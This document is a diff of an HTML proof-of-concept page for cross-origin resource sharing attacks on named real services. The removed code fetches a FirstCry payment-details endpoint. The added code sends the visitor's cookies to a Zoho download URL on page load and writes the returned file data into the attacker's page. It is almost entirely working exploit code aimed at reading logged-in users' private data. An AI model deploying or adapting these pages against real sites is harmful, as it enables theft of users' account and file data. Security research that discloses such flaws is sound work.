@@ -1,36 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>CORS PoC for FirstCry Reorder Checkout</title>
-</head>
 <body>
-  <h1>CORS PoC for FirstCry Reorder Checkout API</h1>
-  <button id="testCors">Test CORS</button>
-  <pre id="output"></pre>
-  <script>
-    document.getElementById('testCors').addEventListener('click', function() {
-      fetch('https://www.firstcry.com/useraccount/mypaymentdetails', {
-        method: 'GET',
-        mode: 'cors', // Enforces CORS
-      })
-      .then(response => {
-        // Display the response status and headers if available
-        const output = document.getElementById('output');
-        output.textContent = `Response Status: ${response.status}\n`;
-        response.headers.forEach((value, key) => {
-          output.textContent += `${key}: ${value}\n`;
-        });
-        return response.text();
-      })
-      .then(text => {
-        console.log('Response Body:', text);
-      })
-      .catch(err => {
-        document.getElementById('output').textContent = 'Error: ' + err;
-        console.error('Error:', err);
-      });
-    });
-  </script>
+<h3>CORS PoC</h3>
+
+<script>
+var url = "https://download.zoho.com/webdownload?x-service=assist&event-id=3602439000000039001&x-cli-msg=eyJzY29wZSI6ImFzc2lzdCIsInpzb2lkIjoiOTA1MjQzMjI0IiwiZmlsZV90eXBlIjoiY3N2In0=";
+
+fetch(url, {
+    method: "GET",
+    credentials: "include"   // <-- send cookies cross-origin
+})
+.then(response => response.text())
+.then(data => {
+    document.write("<pre>" + data + "</pre>");
+})
+.catch(err => {
+    document.write("Error: " + err);
+});
+</script>
+
 </body>
 </html>
